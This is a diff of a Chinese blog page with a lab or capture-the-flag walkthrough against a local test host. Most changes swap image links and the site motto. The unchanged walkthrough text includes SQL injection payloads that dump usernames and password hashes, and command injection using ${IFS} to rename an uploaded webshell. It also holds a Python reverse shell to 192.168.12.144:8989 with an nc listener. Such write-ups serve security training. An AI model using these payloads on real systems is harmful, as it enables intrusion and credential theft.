@@ -160,7 +160,7 @@
         <div class="logo-name">Liduan0</div>
         <div class="logo-desc">
             
-            有善始者实繁，能克终者盖寡
+            每个人都睁着眼睛，但不等于每个人都在看世界，许多人几乎不用自己的眼睛看，他们只听别人说，他们看到的世界永远是别人说的样子
             
         </div>
     </div>
@@ -421,38 +421,56 @@
 
 <p>3.对站点目录进行扫描</p>
 <pre class="line-numbers language-none"><code class="language-none">dirsearch -u &quot;http:&#x2F;&#x2F;192.168.12.163&#x2F;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://img-blog.csdnimg.cn/dab04e25c70b4dc09f395f81921d4dda.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/699a79f592394ef386c760a895ec9194.png" alt="在这里插入图片描述"><br>4.网站指纹识别</p>
+<img src="/post/ed54/2-3.jpg" class>
+
+<img src="/post/ed54/2-4.jpg" class>
+
+<p>4.网站指纹识别</p>
 <pre class="line-numbers language-none"><code class="language-none">whatweb http:&#x2F;&#x2F;192.168.12.163<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://img-blog.csdnimg.cn/2abef7949fbc4b2d960e5fc3b5e00c32.png" alt="在这里插入图片描述"></p>
-<h1 id="3-漏洞挖掘"><a href="#3-漏洞挖掘" class="headerlink" title="3.漏洞挖掘"></a>3.漏洞挖掘</h1><p>1.通过注册登录进入<br><img src="https://img-blog.csdnimg.cn/b2689e6d87914e0cacaa7c3ac50eae13.png" alt="在这里插入图片描述"><br>2.可能存在sql注入，用sqlmap失败，进行手工注入</p>
+<img src="/post/ed54/2-5.jpg" class>
+<h1 id="3-漏洞挖掘"><a href="#3-漏洞挖掘" class="headerlink" title="3.漏洞挖掘"></a>3.漏洞挖掘</h1><p>1.通过注册登录进入</p>
+<img src="/post/ed54/3-1.jpg" class>
+<p>2.可能存在sql注入，用sqlmap失败，进行手工注入</p>
 <blockquote>
 <p>输入：<br>L   –&gt;返回信息			猜测这里存在模糊查询<br>Linux%’ and ‘123’ like ‘1   -&gt;成功返回信息</p>
 </blockquote>
 <p>3.构造payload进行注入，爆破数据库</p>
 <pre class="line-numbers language-none"><code class="language-none">Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;database&#x2F;**&#x2F;(),&#39;2&#39;,&#39;3
 发现数据库：webapp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://img-blog.csdnimg.cn/58dd571c2bc7492496293354ceebcc98.png" alt="在这里插入图片描述"><br>4.继续爆破表名，字段名，字段内的数据</p>
+<img src="/post/ed54/3-2.jpg" class>
+<p>4.继续爆破表名，字段名，字段内的数据</p>
 <pre class="line-numbers language-none"><code class="language-none">表名：Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(table_name),&quot;2&quot;,&quot;3&quot;&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#39;webapp
 字段名：
 Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(column_name),&quot;2&quot;,&quot;3&quot;&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x2F;**&#x2F;like&#x2F;**&#x2F;&#39;users
 字段内数据：
 Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(user),&#39;2&#39;,group_concat(pasword)&#x2F;**&#x2F;from&#x2F;**&#x2F;users&#x2F;**&#x2F;where&#x2F;**&#x2F;1&#x2F;**&#x2F;like&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://img-blog.csdnimg.cn/a8490e38ef0d46e696a9c9b148b95118.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/44ebb7713da540c38e5740b4b6bd296c.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/085bd47e98124d619b5d235e2ec41f65.png" alt="在这里插入图片描述"><br>5.根据上面获取的用户密码，利用前面md5破解网站破解密码</p>
+<img src="/post/ed54/3-3.jpg" class>
+<img src="/post/ed54/3-4.jpg" class>
+<img src="/post/ed54/3-5.jpg" class>
+<p>5.根据上面获取的用户密码，利用前面md5破解网站破解密码</p>
 <blockquote>
 <p>用户：superadmin<br>密码：2386acb2cf356944177746fc92523983<br>破解：Uncrackable</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/b4b15f3f61214159ad94675b63f60f3f.png" alt="在这里插入图片描述"><br>6.利用破解的密码，进行登录<br><img src="https://img-blog.csdnimg.cn/cbd0c30d659044be93c46ce00119925d.png" alt="在这里插入图片描述"><br>7.进行文件上传漏洞的尝试</p>
+<img src="/post/ed54/3-6.jpg" class>
+<p>6.利用破解的密码，进行登录</p>
+<img src="/post/ed54/3-7.jpg" class>
+<p>7.进行文件上传漏洞的尝试</p>
 <blockquote>
 <p>直接上传木马文件 —-》失败<br>修改后缀为jpg —&gt;访问失败–蚁剑连接不上<br>上传的jpg，利用bp进行修改后缀，上传显示成功，页面访问失败</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/5e50329bbfb14fc9b953d65773c9b1b7.png" alt="在这里插入图片描述"><br>8.尝试命令注入漏洞</p>
-<p><img src="https://img-blog.csdnimg.cn/f3b3f62bf87a432289b76f8ff962866d.png" alt="在这里插入图片描述"><br>9.填写数据，利用bp抓包，修改数据</p>
+<img src="/post/ed54/3-8.jpg" class>
+<p>8.尝试命令注入漏洞</p>
+<img src="/post/ed54/3-9.jpg" class>
+<p>9.填写数据，利用bp抓包，修改数据</p>
 <blockquote>
 <p>system(‘ls’)</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/e5eaa0318de94f9cad6cbc4fedbec076.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/af27a02846f943b69458203a52fabea8.png" alt="在这里插入图片描述"><br>10.查看文件上传php文件</p>
+<img src="/post/ed54/3-10.jpg" class>
+<img src="/post/ed54/3-11.jpg" class>
+<p>10.查看文件上传php文件</p>
 <blockquote>
-<p>cat${IFS}welcomeadmin.php<br>文件上传的路径为：&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;<br><img src="https://img-blog.csdnimg.cn/4aea0b14fcf44ac681f1c323e9c793f6.png" alt="在这里插入图片描述"></p>
+<p>cat${IFS}welcomeadmin.php<br>文件上传的路径为：&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;</p>
+<img src="/post/ed54/3-12.jpg" class>
 </blockquote>
 <p>命令执行中空格绕过方法</p>
 <blockquote>
@@ -462,7 +480,11 @@ Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(use
 <blockquote>
 <p>system(‘mv${IFS}&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;inj.jpg${IFS}&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;phin.php’)</p>
 </blockquote>
-<p>访问页面<br><img src="https://img-blog.csdnimg.cn/f7499f9506374c5f917dc9387dd16d49.png" alt="在这里插入图片描述"><br>蚁剑进行连接<br><img src="https://img-blog.csdnimg.cn/b1bfda1485f44d758eba09b007f37043.png" alt="在这里插入图片描述"><br>2.利用脚本,通过蚁剑上传执行</p>
+<p>访问页面</p>
+<img src="/post/ed54/4-1.jpg" class>
+<p>蚁剑进行连接</p>
+<img src="/post/ed54/4-2.jpg" class>
+<p>2.利用脚本,通过蚁剑上传执行</p>
 <blockquote>
 <p>import socket,subprocess,os<br>s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((“192.168.12.144”,8989))<br>os.dup2(s.fileno(),0)<br>os.dup2(s.fileno(),1)<br>os.dup2(s.fileno(),2)<br>p&#x3D;subprocess.call([“&#x2F;bin&#x2F;bash”,”-i”])</p>
 </blockquote>
@@ -470,8 +492,9 @@ Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(use
 <blockquote>
 <p>nc -lvvp 8989</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/58878aa7e38b4a5595e6ac09966261e4.png" alt="在这里插入图片描述"></p>
-<h1 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h1><p>1.在&#x2F;home&#x2F;legacy路径下发现二进制文件touchmenot，执行二进制文件<br><img src="https://img-blog.csdnimg.cn/81c55c6af3994e97b8bdd815c27a1fe4.png" alt="在这里插入图片描述"></p>
+<img src="/post/ed54/4-3.jpg" class>
+<h1 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h1><p>1.在&#x2F;home&#x2F;legacy路径下发现二进制文件touchmenot，执行二进制文件</p>
+<img src="/post/ed54/5-1.jpg" class>
 
                 
             </div>
